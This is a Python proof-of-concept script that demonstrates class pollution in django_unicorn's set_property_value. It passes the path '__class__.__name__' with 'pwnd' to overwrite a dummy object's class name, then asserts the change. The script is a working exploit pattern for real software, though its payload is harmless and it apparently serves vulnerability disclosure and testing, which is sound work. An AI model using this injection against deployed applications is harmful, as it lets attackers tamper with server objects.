# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: set_property_value
# Type: get-attr-set-both

import django
from django.conf import settings
settings.configure(DEBUG=True, DATABASES={}, INSTALLED_APPS=["django_unicorn"])
django.setup()

from django_unicorn.views.action_parsers.utils import set_property_value

class Target:
  def updating(self, *args, **kwargs): pass
  def updated(self, *args, **kwargs): pass
  def resolved(self, *args, **kwargs): pass

target = Target()

payload_value = "pwnd"
PAYLOAD = "__class__.__name__"

def run_poc():
  try:
    set_property_value(target, PAYLOAD, payload_value)
  except AttributeError:
    pass

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
